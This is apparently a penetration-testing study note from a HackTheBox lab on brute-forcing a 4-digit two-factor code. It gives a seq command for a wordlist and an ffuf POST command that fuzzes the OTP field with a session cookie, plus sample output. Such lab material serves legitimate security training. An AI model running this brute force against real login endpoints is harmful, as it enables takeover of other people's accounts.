---
title: d-Bruteforce 2FA Codes
draft: false
tags:
  - 2fa
  - ffuf
---
Two-factor authentication (2FA) provides an additional layer of security to protect user accounts from unauthorized access. Typically, this is achieved by combining knowledge-based authentication (password) with ownership-based authentication (the 2FA device).

## Attacking 2FA

One of the most common 2FA implementations relies on the user's password and a time-based one-time password (TOTP) provided to the user's smartphone by an authenticator app or via SMS.

These TOTPs typically consist only of digits and if it not long enough we can potentially bruteforce it.

e.g Assume we obtained valid credentials (`admin:admin`) but there is 2FA, requiring 4-digit OTP.

Since 4-digit OTP has only 10,000 possible variations, we can easily guess the codes. 

We will use `ffuf` for this purpose.

We will first generate a wordlist of 4-digit numbers:

```shell-session
jadu101@htb[/htb]$ seq -w 0 9999 > tokens.txt
```


Let's specify session token in the `PHPSESSID` cookie to associate the TOTP with our authenticated session.

```shell-session
jadu101@htb[/htb]$ ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"

<SNIP>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 648ms]
    * FUZZ: 6513
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 635ms]
    * FUZZ: 6514

<SNIP>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
    * FUZZ: 9999
```

After we have a hit, corresponding PHPSESSID will be automatically authenticated thus we can access pages like `admin.php`.